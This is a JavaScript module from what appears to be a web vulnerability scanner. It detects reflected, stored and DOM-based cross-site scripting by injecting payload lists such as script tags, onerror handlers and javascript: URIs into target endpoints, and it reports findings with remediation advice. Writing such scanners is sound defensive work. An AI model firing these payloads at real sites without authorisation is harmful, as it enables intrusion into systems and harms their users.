// backend/src/tests/xssTest.js — FULL REWRITE
// Complete XSS detection: Reflected, Stored (via OAST), DOM-based (via Puppeteer)
import axios from 'axios';
import { getSharedBrowser } from '../utils/screenshotCapture.js';

const REFLECTED_PAYLOADS = {
    html_body: ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>', '<details open ontoggle=alert(1)>'],
    html_attr: ['" onmouseover="alert(1)', "' onfocus='alert(1)", '" autofocus onfocus="alert(1)'],
    js_string: ["'; alert(1); //", "\\'; alert(1); //", "'-alert(1)-'"],
    url_param: ['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>'],
    generic: ['<xss>', '"<>\'', '<ScRiPt>alert(1)</ScRiPt>']
};

const DOM_SOURCES = ['location.hash', 'location.search', 'document.URL', 'document.referrer', 'window.name'];
const DOM_SINKS = ['innerHTML', 'outerHTML', 'document.write', 'eval(', 'setTimeout(', 'setInterval('];

export async function testXSS(endpoint, options = {}) {
    const findings = [];
    const aggressive = options.aggressive || false;
    const oastClient = options.oastClient || null;

    if (!endpoint.parameters && !aggressive) return findings;

    // 1. Reflected XSS
    const reflectedFindings = await testReflectedXSS(endpoint, aggressive);
    findings.push(...reflectedFindings);

    // 2. Stored XSS (via OAST callback)
    if (oastClient) {
        const storedFindings = await testStoredXSS(endpoint, oastClient);
        findings.push(...storedFindings);
    }

    // 3. DOM-based XSS (via Puppeteer)
    if (aggressive) {
        const domFindings = await testDOMXSS(endpoint);
        findings.push(...domFindings);
    }

    return findings;
}

async function testReflectedXSS(endpoint, aggressive) {
    const findings = [];
    if (!endpoint.parameters) return findings;
    const params = typeof endpoint.parameters === 'object' ? Object.keys(endpoint.parameters) : [];

    for (const param of params) {
        // First: inject a canary to find reflection context
        const canary = `secora${Math.random().toString(36).substring(7)}`;
        try {
            const testUrl = new URL(endpoint.url);
            testUrl.searchParams.set(param, canary);
            const resp = await axios.get(testUrl.toString(), { timeout: 10000, validateStatus: () => true });
            const body = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data);

            if (!body.includes(canary)) continue; // Not reflected

            // Determine context and select payloads
            const context = detectReflectionContext(body, canary);
            const payloads = aggressive ? [...REFLECTED_PAYLOADS[context] || [], ...REFLECTED_PAYLOADS.generic] : REFLECTED_PAYLOADS.generic;

            for (const payload of payloads) {
                try {
                    const attackUrl = new URL(endpoint.url);
                    attackUrl.searchParams.set(param, payload);
                    const attackResp = await axios.get(attackUrl.toString(), { timeout: 10000, validateStatus: () => true });
                    const attackBody = typeof attackResp.data === 'string' ? attackResp.data : JSON.stringify(attackResp.data);

                    if (attackBody.includes(payload) && !isEncoded(attackBody, payload)) {
                        findings.push({
                            assetId: endpoint.assetId, endpointId: endpoint.id,
                            title: 'Reflected Cross-Site Scripting (XSS)',
                            description: `Parameter '${param}' reflects user input in ${context} context without encoding.`,
                            category: 'XSS', severity: 'HIGH', cvss: 7.1, owasp: 'A03:2021', cwe: 'CWE-79',
                            remediation: 'Encode all user input before rendering. Use context-aware output encoding.',
                            references: ['https://owasp.org/www-community/attacks/xss/', 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html'],
                            detectedBy: 'xss-engine', confidence: aggressive ? 92 : 75,
                            evidence: [
                                { type: 'REQUEST', title: 'XSS Payload Injected', content: `URL: ${attackUrl}\nParam: ${param}\nPayload: ${payload}\nContext: ${context}` },
                                { type: 'RESPONSE', title: 'Payload Reflected', content: `Status: ${attackResp.status}\nPayload reflected without encoding in ${context} context` }
                            ]
                        });
                        break; // One finding per param
                    }
                } catch { /* continue */ }
            }
        } catch { /* continue */ }
    }
    return findings;
}

async function testStoredXSS(endpoint, oastClient) {
    const findings = [];
    if (!endpoint.parameters) return findings;
    const params = typeof endpoint.parameters === 'object' ? Object.keys(endpoint.parameters) : [];

    // Only test POST endpoints or endpoints with writable-looking params
    const writableParams = params.filter(p =>
        /comment|message|body|text|content|note|title|name|description|bio|about|review|feedback/i.test(p)
    );

    for (const param of writableParams) {
        const result = await oastClient.injectAndVerify({
            testType: 'xss',
            context: `stored:${param}`,
            injector: async (oast) => {
                const payload = oast.payloads.script;
                try {
                    const data = {};
                    data[param] = payload;
                    await axios.post(endpoint.url, data, {
                        timeout: 10000, validateStatus: () => true,
                        headers: { 'Content-Type': 'application/json' }
                    });
                } catch { /* ignore */ }
            },
            timeout: 30000
        });

        if (result) {
            findings.push({
                assetId: endpoint.assetId, endpointId: endpoint.id,
                title: 'Stored Cross-Site Scripting (XSS)',
                description: `Parameter '${param}' stores user input containing XSS payload. Confirmed via OAST callback when payload executed.`,
                category: 'XSS', severity: 'CRITICAL', cvss: 9.0, owasp: 'A03:2021', cwe: 'CWE-79',
                remediation: 'Sanitize and encode all stored user input. Implement CSP headers.',
                detectedBy: 'xss-engine', confidence: 98,
                evidence: result.evidence
            });
        }
    }
    return findings;
}

async function testDOMXSS(endpoint) {
    const findings = [];
    let page = null;

    try {
        const browser = await getSharedBrowser();
        page = await browser.newPage();
        await page.setViewport({ width: 1280, height: 800 });

        // Inject via URL fragment
        const domPayloads = [
            '#<img src=x onerror=alert(1)>',
            '#"><script>alert(1)</script>',
            '?xss=<script>alert(1)</script>#test'
        ];

        for (const payload of domPayloads) {
            try {
                const testUrl = endpoint.url + payload;
                let alertTriggered = false;

                page.on('dialog', async (dialog) => {
                    alertTriggered = true;
                    await dialog.dismiss();
                });

                await page.goto(testUrl, { waitUntil: 'networkidle2', timeout: 10000 });
                await new Promise(r => setTimeout(r, 2000));

                // Check for DOM sink usage with user input
                const domVuln = await page.evaluate((sources, sinks) => {
                    const html = document.documentElement.innerHTML;
                    const hasSink = sinks.some(s => html.includes(s));
                    return hasSink;
                }, DOM_SOURCES, DOM_SINKS);

                if (alertTriggered) {
                    findings.push({
                        assetId: endpoint.assetId, endpointId: endpoint.id,
                        title: 'DOM-Based Cross-Site Scripting (XSS)',
                        description: `DOM XSS triggered via URL fragment/parameter. Payload executed in browser context.`,
                        category: 'XSS', severity: 'HIGH', cvss: 7.1, owasp: 'A03:2021', cwe: 'CWE-79',
                        remediation: 'Avoid using innerHTML with user-controlled data. Use textContent or sanitize DOM inputs.',
                        detectedBy: 'xss-engine', confidence: 95,
                        evidence: [
                            { type: 'REQUEST', title: 'DOM XSS Payload', content: `URL: ${testUrl}\nPayload: ${payload}` },
                            { type: 'LOG', title: 'Alert Triggered', content: 'JavaScript alert() executed in Puppeteer browser, confirming DOM XSS.' }
                        ]
                    });
                    break;
                }
            } catch { /* continue */ }
        }
    } catch (err) {
        console.warn(`DOM XSS test error: ${err.message}`);
    } finally {
        if (page) await page.close().catch(() => {});
    }
    return findings;
}

function detectReflectionContext(body, canary) {
    const idx = body.indexOf(canary);
    if (idx < 0) return 'generic';
    const before = body.substring(Math.max(0, idx - 50), idx);
    if (/<[^>]*$/.test(before) && /=['"]/.test(before)) return 'html_attr';
    if (/['"]/.test(before) && /[;,+]/.test(before.slice(-5))) return 'js_string';
    if (/href=|src=|action=/.test(before)) return 'url_param';
    return 'html_body';
}

function isEncoded(body, payload) {
    const encoded = payload.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
    return body.includes(encoded) && !body.includes(payload);
}
